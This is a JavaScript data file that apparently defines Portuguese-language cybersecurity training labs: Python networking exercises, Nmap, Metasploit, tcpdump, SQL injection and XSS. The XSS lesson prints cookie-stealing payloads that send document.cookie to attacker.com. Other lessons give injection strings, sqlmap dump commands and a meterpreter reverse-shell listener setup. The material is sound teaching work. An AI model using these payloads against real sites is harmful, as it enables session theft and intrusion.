// Sistema completo de laboratórios educacionais de cibersegurança

const LABORATORIES = {
  // Python para Cibersegurança
  python_cyber: {
    id: 'python_cyber',
    name: 'Python para Cibersegurança',
    category: 'Linguagens de Programação',
    icon: '🐍',
    image: 'python:3.11-slim',
    difficulty: 'beginner',
    duration: '4 horas',
    description: 'Aprenda Python do zero com foco em cibersegurança e automação de testes',
    objectives: [
      'Dominar sintaxe básica do Python',
      'Trabalhar com sockets e requisições HTTP',
      'Criar scripts de automação para segurança',
      'Manipular arquivos e processos'
    ],
    prerequisites: [],
    tools: ['Python 3.11', 'pip', 'requests', 'scapy'],
    modules: [
      {
        id: 1,
        title: 'Introdução ao Python',
        description: 'Fundamentos da linguagem Python',
        lessons: [
          {
            id: 1,
            title: 'Variáveis e Tipos de Dados',
            content: `# Python - Variáveis e Tipos de Dados

## Conceitos Fundamentais

Python é uma linguagem de programação poderosa e versátil, muito usada em cibersegurança.

### Variáveis
\`\`\`python
# Strings
nome = "Hacker Ético"
ip_address = "192.168.1.1"

# Números
porta = 8080
timeout = 30.5

# Booleanos
is_secure = True
is_vulnerable = False

# Listas
portas = [21, 22, 80, 443, 8080]
hosts = ["192.168.1.1", "192.168.1.2"]

# Dicionários
servico = {
    "porta": 80,
    "protocolo": "HTTP",
    "status": "aberto"
}
\`\`\`

### Operações Básicas
\`\`\`python
# Concatenação
mensagem = "Porta " + str(porta) + " está aberta"

# F-strings (recomendado)
mensagem = f"Porta {porta} está aberta"

# Operações com listas
portas.append(3306)  # Adiciona MySQL
portas.remove(21)     # Remove FTP
\`\`\``,
            exercises: [
              {
                id: 1,
                title: 'Criar Variáveis de Rede',
                description: 'Crie variáveis para armazenar informações de rede',
                initialCode: `# Crie as seguintes variáveis:
# - target_ip: "10.0.0.1"
# - target_port: 443
# - protocol: "HTTPS"
# - is_encrypted: True

# Seu código aqui:
`,
                solution: `target_ip = "10.0.0.1"
target_port = 443
protocol = "HTTPS"
is_encrypted = True

print(f"Alvo: {target_ip}:{target_port}")
print(f"Protocolo: {protocol}")
print(f"Criptografado: {is_encrypted}")`,
                validation: {
                  type: 'output_contains',
                  expected: ['10.0.0.1', '443', 'HTTPS']
                }
              },
              {
                id: 2,
                title: 'Trabalhar com Listas de Portas',
                description: 'Manipule uma lista de portas comuns',
                initialCode: `# Crie uma lista com as portas: 21, 22, 80, 443
# Adicione a porta 3389 (RDP)
# Remova a porta 21 (FTP)
# Imprima a lista final

# Seu código aqui:
`,
                solution: `portas = [21, 22, 80, 443]
portas.append(3389)
portas.remove(21)
print(f"Portas: {portas}")`,
                validation: {
                  type: 'output_contains',
                  expected: ['22', '80', '443', '3389']
                }
              }
            ]
          },
          {
            id: 2,
            title: 'Estruturas de Controle',
            content: `# Estruturas de Controle em Python

## If/Else - Tomada de Decisões

\`\`\`python
porta = 80

if porta == 80:
    print("HTTP detectado")
elif porta == 443:
    print("HTTPS detectado")
else:
    print("Porta desconhecida")
\`\`\`

## Loops - Iteração

### For Loop
\`\`\`python
# Scanning de portas
portas = [21, 22, 80, 443, 3306]

for porta in portas:
    print(f"Testando porta {porta}...")

# Range
for i in range(1, 256):
    ip = f"192.168.1.{i}"
    print(f"Scanning {ip}")
\`\`\`

### While Loop
\`\`\`python
tentativas = 0
max_tentativas = 3

while tentativas < max_tentativas:
    print(f"Tentativa {tentativas + 1}")
    tentativas += 1
\`\`\``,
            exercises: [
              {
                id: 3,
                title: 'Port Scanner Simples',
                description: 'Crie um scanner que identifica portas conhecidas',
                initialCode: `# Crie um dicionário com portas e serviços:
# 21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS"
# Use um for loop para iterar pelas portas [22, 80, 8080]
# Imprima o serviço se a porta estiver no dicionário

# Seu código aqui:
`,
                solution: `servicos = {
    21: "FTP",
    22: "SSH",
    80: "HTTP",
    443: "HTTPS"
}

portas_detectadas = [22, 80, 8080]

for porta in portas_detectadas:
    if porta in servicos:
        print(f"Porta {porta}: {servicos[porta]}")
    else:
        print(f"Porta {porta}: Desconhecido")`,
                validation: {
                  type: 'output_contains',
                  expected: ['SSH', 'HTTP', 'Desconhecido']
                }
              }
            ]
          },
          {
            id: 3,
            title: 'Funções em Python',
            content: `# Funções em Python

## Definindo Funções

\`\`\`python
def scan_porta(ip, porta):
    """Simula o scanning de uma porta"""
    print(f"Scanning {ip}:{porta}")
    return True

# Chamando a função
resultado = scan_porta("192.168.1.1", 80)
\`\`\`

## Funções com Retorno

\`\`\`python
def validar_ip(ip):
    """Valida formato de IP"""
    partes = ip.split(".")
    if len(partes) != 4:
        return False

    for parte in partes:
        if not parte.isdigit():
            return False
        if int(parte) > 255:
            return False

    return True

# Testando
print(validar_ip("192.168.1.1"))  # True
print(validar_ip("300.1.1.1"))    # False
\`\`\``,
            exercises: [
              {
                id: 4,
                title: 'Função de Validação de Porta',
                description: 'Crie uma função que valida se uma porta está no range válido (1-65535)',
                initialCode: `# Crie a função validar_porta(porta)
# Retorna True se porta entre 1 e 65535
# Retorna False caso contrário

# Seu código aqui:


# Testes (não modificar)
print(validar_porta(80))     # True
print(validar_porta(70000))  # False
print(validar_porta(-1))     # False`,
                solution: `def validar_porta(porta):
    return 1 <= porta <= 65535

print(validar_porta(80))     # True
print(validar_porta(70000))  # False
print(validar_porta(-1))     # False`,
                validation: {
                  type: 'function_exists',
                  function_name: 'validar_porta'
                }
              }
            ]
          }
        ]
      },
      {
        id: 2,
        title: 'Network Programming com Python',
        description: 'Aprenda a criar ferramentas de rede',
        lessons: [
          {
            id: 4,
            title: 'Trabalhando com Sockets',
            content: `# Sockets em Python

## Criando um Cliente TCP

\`\`\`python
import socket

def conectar_servidor(host, porta):
    # Criar socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Conectar
        s.connect((host, porta))
        print(f"Conectado a {host}:{porta}")

        # Enviar dados
        s.send(b"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n")

        # Receber resposta
        resposta = s.recv(4096)
        print(resposta.decode())

    except Exception as e:
        print(f"Erro: {e}")
    finally:
        s.close()

# Testar
conectar_servidor("example.com", 80)
\`\`\`

## Port Scanner Simples

\`\`\`python
import socket

def scan_porta(host, porta):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        resultado = s.connect_ex((host, porta))
        s.close()
        return resultado == 0
    except:
        return False

# Scanning
host = "scanme.nmap.org"
portas = [21, 22, 80, 443]

for porta in portas:
    if scan_porta(host, porta):
        print(f"✓ Porta {porta} ABERTA")
    else:
        print(f"✗ Porta {porta} FECHADA")
\`\`\``,
            exercises: [
              {
                id: 5,
                title: 'Banner Grabbing',
                description: 'Crie uma função que captura o banner de um serviço',
                initialCode: `import socket

# Crie a função grab_banner(host, porta)
# Conecte ao serviço e receba os primeiros bytes
# Retorne o banner como string

def grab_banner(host, porta):
    # Seu código aqui:
    pass


# Teste
print(grab_banner("scanme.nmap.org", 22))`,
                solution: `import socket

def grab_banner(host, porta):
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((host, porta))
        banner = s.recv(1024)
        s.close()
        return banner.decode().strip()
    except:
        return "Sem banner"

print(grab_banner("scanme.nmap.org", 22))`,
                validation: {
                  type: 'function_exists',
                  function_name: 'grab_banner'
                }
              }
            ]
          }
        ]
      },
      {
        id: 3,
        title: 'Automação e Scripts',
        description: 'Crie ferramentas automatizadas de segurança',
        lessons: [
          {
            id: 5,
            title: 'Trabalhando com Requisições HTTP',
            content: `# Requisições HTTP com Python

## Biblioteca Requests

\`\`\`python
import requests

# GET simples
response = requests.get("https://api.github.com")
print(response.status_code)
print(response.json())

# POST com dados
dados = {"username": "admin", "password": "teste"}
response = requests.post("https://httpbin.org/post", data=dados)
print(response.text)

# Headers customizados
headers = {
    "User-Agent": "Security Scanner 1.0",
    "X-Custom-Header": "Value"
}
response = requests.get("https://httpbin.org/headers", headers=headers)
\`\`\`

## Web Directory Scanner

\`\`\`python
import requests

def scan_directories(base_url, wordlist):
    """Procura por diretórios comuns"""
    found = []

    for directory in wordlist:
        url = f"{base_url}/{directory}"
        try:
            response = requests.get(url, timeout=2)
            if response.status_code == 200:
                print(f"✓ Encontrado: {url}")
                found.append(url)
            elif response.status_code == 403:
                print(f"⚠ Proibido: {url}")
        except:
            pass

    return found

# Teste
wordlist = ["admin", "login", "dashboard", "api", "config"]
scan_directories("http://example.com", wordlist)
\`\`\``,
            exercises: [
              {
                id: 6,
                title: 'Subdomain Enumeration',
                description: 'Crie um script que enumera subdomínios',
                initialCode: `import requests

# Crie a função check_subdomain(subdomain, domain)
# Retorna True se o subdomínio existe (responde)

def check_subdomain(subdomain, domain):
    # Seu código aqui:
    pass


# Teste
subdomains = ["www", "mail", "ftp", "admin"]
domain = "example.com"

for sub in subdomains:
    if check_subdomain(sub, domain):
        print(f"✓ {sub}.{domain} existe")`,
                solution: `import requests

def check_subdomain(subdomain, domain):
    url = f"http://{subdomain}.{domain}"
    try:
        response = requests.get(url, timeout=2)
        return response.status_code < 400
    except:
        return False

subdomains = ["www", "mail", "ftp", "admin"]
domain = "example.com"

for sub in subdomains:
    if check_subdomain(sub, domain):
        print(f"✓ {sub}.{domain} existe")`,
                validation: {
                  type: 'function_exists',
                  function_name: 'check_subdomain'
                }
              }
            ]
          }
        ]
      }
    ],
    challenges: [
      {
        id: 'challenge_1',
        title: 'Desafio Final: Multi-Tool Scanner',
        description: 'Crie uma ferramenta que combina port scanning, banner grabbing e detecção de serviços',
        difficulty: 'intermediate',
        points: 100,
        requirements: [
          'Função para scan de múltiplas portas',
          'Captura de banners dos serviços',
          'Identificação automática de serviços',
          'Relatório formatado dos resultados'
        ],
        starter_code: `import socket

class SecurityScanner:
    def __init__(self, target):
        self.target = target
        self.results = []

    def scan_port(self, port):
        # Implemente aqui
        pass

    def grab_banner(self, port):
        # Implemente aqui
        pass

    def identify_service(self, port, banner):
        # Implemente aqui
        pass

    def scan_all(self, ports):
        # Implemente aqui
        pass

    def generate_report(self):
        # Implemente aqui
        pass

# Teste
scanner = SecurityScanner("scanme.nmap.org")
scanner.scan_all([21, 22, 80, 443])
scanner.generate_report()`,
        hints: [
          'Use socket.connect_ex() para testar portas',
          'Implemente timeout para não travar',
          'Crie um dicionário com portas e serviços conhecidos',
          'Format o relatório com cores ANSI'
        ]
      }
    ]
  },

  // Kali Linux - Ferramentas de Pentest
  kali_tools: {
    id: 'kali_tools',
    name: 'Kali Linux - Ferramentas de Pentest',
    category: 'Cibersegurança',
    icon: '🔓',
    image: 'kalilinux/kali-rolling',
    difficulty: 'intermediate',
    duration: '6 horas',
    description: 'Domine as principais ferramentas do Kali Linux para testes de penetração',
    objectives: [
      'Utilizar Nmap para reconnaissance',
      'Explorar vulnerabilidades com Metasploit',
      'Capturar e analisar tráfego de rede',
      'Realizar ataques de força bruta éticos'
    ],
    prerequisites: ['Linux Básico', 'Redes TCP/IP'],
    tools: ['Nmap', 'Metasploit', 'Burp Suite', 'Wireshark', 'John the Ripper'],
    modules: [
      {
        id: 1,
        title: 'Information Gathering com Nmap',
        description: 'Aprenda técnicas avançadas de reconnaissance',
        lessons: [
          {
            id: 1,
            title: 'Scanning Básico com Nmap',
            content: `# Nmap - Network Mapper

## O que é Nmap?

Nmap é a ferramenta mais popular para descoberta de rede e auditoria de segurança.

## Comandos Básicos

### Scan Simples
\`\`\`bash
# Scan básico de host
nmap scanme.nmap.org

# Scan de múltiplos hosts
nmap 192.168.1.1 192.168.1.2

# Scan de range
nmap 192.168.1.1-50

# Scan de subnet inteira
nmap 192.168.1.0/24
\`\`\`

### Tipos de Scan

\`\`\`bash
# TCP Connect Scan (padrão)
nmap -sT scanme.nmap.org

# SYN Scan (stealth - requer root)
sudo nmap -sS scanme.nmap.org

# UDP Scan
sudo nmap -sU scanme.nmap.org

# Scan de portas específicas
nmap -p 80,443,8080 scanme.nmap.org

# Scan de range de portas
nmap -p 1-1000 scanme.nmap.org

# Scan de todas as portas
nmap -p- scanme.nmap.org
\`\`\`

### Detecção de Serviços e Versões

\`\`\`bash
# Detectar versões de serviços
nmap -sV scanme.nmap.org

# Detecção agressiva
nmap -A scanme.nmap.org

# Detecção de OS
sudo nmap -O scanme.nmap.org
\`\`\`

### Velocidade do Scan

\`\`\`bash
# Scan lento (stealth)
nmap -T2 scanme.nmap.org

# Scan normal
nmap -T3 scanme.nmap.org

# Scan rápido
nmap -T4 scanme.nmap.org

# Scan muito rápido (pode ser detectado)
nmap -T5 scanme.nmap.org
\`\`\``,
            exercises: [
              {
                id: 1,
                title: 'Reconnaissance Básico',
                description: 'Use Nmap para mapear um alvo',
                tasks: [
                  'Execute um scan básico em scanme.nmap.org',
                  'Identifique quantas portas estão abertas',
                  'Liste os serviços detectados',
                  'Copie a saída completa do scan'
                ],
                commands: [
                  'nmap scanme.nmap.org',
                  'nmap -sV scanme.nmap.org'
                ]
              },
              {
                id: 2,
                title: 'Port Scanning Avançado',
                description: 'Scan de portas específicas e detecção de versões',
                tasks: [
                  'Scan apenas as portas 22, 80, 443',
                  'Detecte as versões dos serviços',
                  'Identifique o sistema operacional (se possível)',
                  'Salve o resultado em um arquivo'
                ],
                commands: [
                  'nmap -p 22,80,443 -sV scanme.nmap.org',
                  'sudo nmap -O scanme.nmap.org',
                  'nmap -oN resultado.txt scanme.nmap.org'
                ]
              }
            ]
          },
          {
            id: 2,
            title: 'NSE Scripts',
            content: `# Nmap Scripting Engine (NSE)

## Scripts de Descoberta

\`\`\`bash
# Listar scripts disponíveis
ls /usr/share/nmap/scripts/ | grep -i http

# Script padrão de descoberta
nmap --script=default scanme.nmap.org

# Scripts de vulnerabilidades
nmap --script=vuln scanme.nmap.org

# Script específico
nmap --script=http-title scanme.nmap.org
\`\`\`

## Scripts Úteis para Web

\`\`\`bash
# Descobrir diretórios
nmap --script=http-enum scanme.nmap.org

# Headers HTTP
nmap --script=http-headers scanme.nmap.org

# Métodos HTTP permitidos
nmap --script=http-methods scanme.nmap.org

# Robots.txt
nmap --script=http-robots.txt scanme.nmap.org
\`\`\`

## Scripts de Autenticação

\`\`\`bash
# Brute force SSH
nmap --script=ssh-brute scanme.nmap.org

# Brute force FTP
nmap --script=ftp-brute scanme.nmap.org

# Verificar credenciais padrão
nmap --script=http-default-accounts scanme.nmap.org
\`\`\``,
            exercises: [
              {
                id: 3,
                title: 'Vulnerability Scanning',
                description: 'Use scripts NSE para encontrar vulnerabilidades',
                tasks: [
                  'Execute scripts de vulnerabilidades no alvo',
                  'Identifique vulnerabilidades encontradas',
                  'Execute script de enumeração HTTP',
                  'Liste os diretórios descobertos'
                ],
                commands: [
                  'nmap --script=vuln scanme.nmap.org',
                  'nmap --script=http-enum -p 80 scanme.nmap.org'
                ]
              }
            ]
          }
        ]
      },
      {
        id: 2,
        title: 'Exploração com Metasploit',
        description: 'Framework de exploração de vulnerabilidades',
        lessons: [
          {
            id: 3,
            title: 'Introdução ao Metasploit',
            content: `# Metasploit Framework

## Iniciando o Metasploit

\`\`\`bash
# Iniciar console
msfconsole

# Com banner customizado
msfconsole -q
\`\`\`

## Comandos Básicos

\`\`\`bash
# Procurar exploits
search [termo]

# Exemplo: procurar exploits SSH
search ssh

# Usar um exploit
use exploit/multi/handler

# Ver opções
show options

# Ver payloads disponíveis
show payloads

# Definir opções
set LHOST 192.168.1.100
set LPORT 4444

# Executar exploit
exploit
run
\`\`\`

## Estrutura do Metasploit

- **Exploits**: Código que explora vulnerabilidades
- **Payloads**: Código executado após exploração
- **Auxiliary**: Módulos auxiliares (scanners, fuzzers)
- **Post**: Módulos pós-exploração
- **Encoders**: Ofuscação de payloads

## Workflow Típico

1. Reconnaissance (nmap, auxiliary)
2. Escolher exploit apropriado
3. Configurar payload
4. Definir target e options
5. Executar exploit
6. Pós-exploração`,
            exercises: [
              {
                id: 4,
                title: 'Configurar Listener',
                description: 'Configure um listener para reverse shell',
                tasks: [
                  'Inicie msfconsole',
                  'Use o módulo exploit/multi/handler',
                  'Configure payload para meterpreter reverse TCP',
                  'Defina LHOST e LPORT',
                  'Execute o listener'
                ],
                commands: [
                  'msfconsole',
                  'use exploit/multi/handler',
                  'set payload windows/meterpreter/reverse_tcp',
                  'set LHOST 0.0.0.0',
                  'set LPORT 4444',
                  'exploit'
                ]
              }
            ]
          }
        ]
      }
    ],
    challenges: [
      {
        id: 'challenge_kali_1',
        title: 'Desafio: Pentest Completo',
        description: 'Realize um teste de penetração completo em um ambiente controlado',
        difficulty: 'advanced',
        points: 200,
        requirements: [
          'Enumerar todos os serviços do alvo',
          'Identificar pelo menos 3 vulnerabilidades',
          'Explorar uma vulnerabilidade',
          'Documentar todo o processo'
        ]
      }
    ]
  },

  // Network Security
  network_security: {
    id: 'network_security',
    name: 'Network Security & Packet Analysis',
    category: 'Cibersegurança',
    icon: '🦈',
    image: 'linuxserver/wireshark',
    difficulty: 'intermediate',
    duration: '5 horas',
    description: 'Análise de tráfego de rede e detecção de ataques',
    objectives: [
      'Capturar e analisar pacotes com tcpdump',
      'Usar Wireshark para análise profunda',
      'Identificar padrões de ataque',
      'Implementar regras de firewall'
    ],
    prerequisites: ['Redes TCP/IP', 'Protocolos básicos'],
    tools: ['tcpdump', 'Wireshark', 'tshark', 'iptables'],
    modules: [
      {
        id: 1,
        title: 'Captura de Pacotes',
        description: 'Técnicas de captura e análise',
        lessons: [
          {
            id: 1,
            title: 'tcpdump - Básico',
            content: `# tcpdump - Packet Sniffer

## Comandos Básicos

\`\`\`bash
# Capturar todas as interfaces
sudo tcpdump

# Interface específica
sudo tcpdump -i eth0

# Capturar N pacotes
sudo tcpdump -c 10

# Salvar em arquivo
sudo tcpdump -w captura.pcap

# Ler arquivo
sudo tcpdump -r captura.pcap
\`\`\`

## Filtros

\`\`\`bash
# Filtrar por host
sudo tcpdump host 192.168.1.1

# Filtrar por porta
sudo tcpdump port 80

# Filtrar por protocolo
sudo tcpdump tcp

# Combinações
sudo tcpdump 'tcp and port 80 and host 192.168.1.1'
\`\`\`

## Análise de Protocolos

\`\`\`bash
# Tráfego HTTP
sudo tcpdump -A 'tcp port 80'

# Tráfego DNS
sudo tcpdump 'udp port 53'

# Três-way handshake TCP
sudo tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'
\`\`\``,
            exercises: [
              {
                id: 1,
                title: 'Captura de Tráfego HTTP',
                description: 'Capture e analise requisições HTTP',
                tasks: [
                  'Capture tráfego HTTP na porta 80',
                  'Faça uma requisição com curl',
                  'Identifique o método HTTP usado',
                  'Extraia o User-Agent'
                ],
                commands: [
                  'sudo tcpdump -i any -A port 80',
                  'curl http://example.com'
                ]
              }
            ]
          }
        ]
      }
    ]
  },

  // Web Application Security
  web_security: {
    id: 'web_security',
    name: 'Web Application Security',
    category: 'Cibersegurança',
    icon: '🕷️',
    image: 'owasp/zap2docker-stable',
    difficulty: 'intermediate',
    duration: '8 horas',
    description: 'Testes de segurança em aplicações web - OWASP Top 10',
    objectives: [
      'Identificar e explorar SQL Injection',
      'Executar ataques XSS',
      'Testar autenticação e sessões',
      'Usar ferramentas automatizadas'
    ],
    prerequisites: ['HTTP', 'HTML/JavaScript', 'SQL básico'],
    tools: ['OWASP ZAP', 'Burp Suite', 'SQLMap', 'curl'],
    modules: [
      {
        id: 1,
        title: 'OWASP Top 10',
        description: 'As 10 vulnerabilidades mais críticas',
        lessons: [
          {
            id: 1,
            title: 'SQL Injection',
            content: `# SQL Injection

## O que é SQL Injection?

SQL Injection é uma vulnerabilidade que permite ao atacante manipular queries SQL.

## Tipos de SQL Injection

### Error-Based
\`\`\`sql
-- Input malicioso
admin' OR '1'='1

-- Query resultante
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='...'
\`\`\`

### Union-Based
\`\`\`sql
-- Extrair dados de outras tabelas
' UNION SELECT username, password FROM admin_users--
\`\`\`

### Blind SQL Injection
\`\`\`sql
-- Testar condições
' AND 1=1-- (retorna normal)
' AND 1=2-- (retorna vazio)

-- Extrair dados caractere por caractere
' AND SUBSTRING(password,1,1)='a'--
\`\`\`

## Testando com SQLMap

\`\`\`bash
# Teste básico
sqlmap -u "http://target.com/page?id=1"

# Com cookie de sessão
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Extrair databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Extrair tabelas
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Extrair dados
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
\`\`\`

## Prevenção

1. Use prepared statements
2. Valide e sanitize inputs
3. Princípio do menor privilégio
4. WAF (Web Application Firewall)`,
            exercises: [
              {
                id: 1,
                title: 'Identificar SQL Injection',
                description: 'Teste um formulário de login vulnerável',
                tasks: [
                  'Teste com entrada: admin\' OR \'1\'=\'1',
                  'Observe a resposta do servidor',
                  'Tente bypassar a autenticação',
                  'Liste as consequências'
                ],
                initialCode: `-- URL de teste
http://testphp.vulnweb.com/login.php

-- Teste manual com curl
curl -X POST http://testphp.vulnweb.com/login.php \\
  -d "username=admin' OR '1'='1&password=anything"

-- Ou use sqlmap
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"`
              }
            ]
          },
          {
            id: 2,
            title: 'Cross-Site Scripting (XSS)',
            content: `# Cross-Site Scripting (XSS)

## Tipos de XSS

### Reflected XSS
\`\`\`javascript
// URL maliciosa
http://target.com/search?q=<script>alert('XSS')</script>

// Cookie stealing
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
\`\`\`

### Stored XSS
\`\`\`javascript
// Payload armazenado no banco
<img src=x onerror="alert('XSS')">

// Session hijacking
<script>
  new Image().src = 'http://attacker.com/log?c=' + document.cookie;
</script>
\`\`\`

### DOM-Based XSS
\`\`\`javascript
// Código vulnerável
document.getElementById('result').innerHTML = location.hash;

// Exploit
http://target.com/page#<img src=x onerror=alert('XSS')>
\`\`\`

## Payloads Comuns

\`\`\`javascript
// Básico
<script>alert('XSS')</script>

// Bypass de filtros
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

// Ofuscação
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
\`\`\`

## Prevenção

1. Encode outputs
2. Content Security Policy (CSP)
3. HTTPOnly cookies
4. Validação de inputs`,
            exercises: [
              {
                id: 2,
                title: 'Explorar XSS Refletido',
                description: 'Encontre e explore uma vulnerabilidade XSS',
                tasks: [
                  'Identifique campo vulnerável',
                  'Injete um alert simples',
                  'Crie payload para roubar cookie',
                  'Teste diferentes bypasses'
                ],
                payloads: [
                  '<script>alert("XSS")</script>',
                  '<img src=x onerror=alert("XSS")>',
                  '<svg onload=alert("XSS")>',
                  '"><script>alert(String.fromCharCode(88,83,83))</script>'
                ]
              }
            ]
          }
        ]
      }
    ]
  },

  // Docker & Containers
  docker_advanced: {
    id: 'docker_advanced',
    name: 'Docker & Container Security',
    category: 'DevOps',
    icon: '🐳',
    image: 'docker:dind',
    difficulty: 'intermediate',
    duration: '6 horas',
    description: 'Segurança em containers Docker e orquestração',
    objectives: [
      'Criar e gerenciar containers seguros',
      'Analisar imagens Docker',
      'Implementar network segmentation',
      'Auditar configurações de segurança'
    ],
    prerequisites: ['Linux básico', 'Conceitos de containers'],
    tools: ['Docker', 'Docker Compose', 'Trivy', 'Docker Bench'],
    modules: []
  }
};

// Função para obter laboratório por ID
const getLaboratoryById = (id) => {
  return LABORATORIES[id] || null;
};

// Função para listar todos os laboratórios
const getAllLaboratories = () => {
  return Object.values(LABORATORIES).map(lab => ({
    id: lab.id,
    name: lab.name,
    category: lab.category,
    icon: lab.icon,
    difficulty: lab.difficulty,
    duration: lab.duration,
    description: lab.description,
    moduleCount: lab.modules.length,
    challengeCount: lab.challenges ? lab.challenges.length : 0
  }));
};

// Função para obter categorias
const getCategories = () => {
  const categories = [...new Set(Object.values(LABORATORIES).map(lab => lab.category))];
  return categories;
};

module.exports = {
  LABORATORIES,
  getLaboratoryById,
  getAllLaboratories,
  getCategories
};
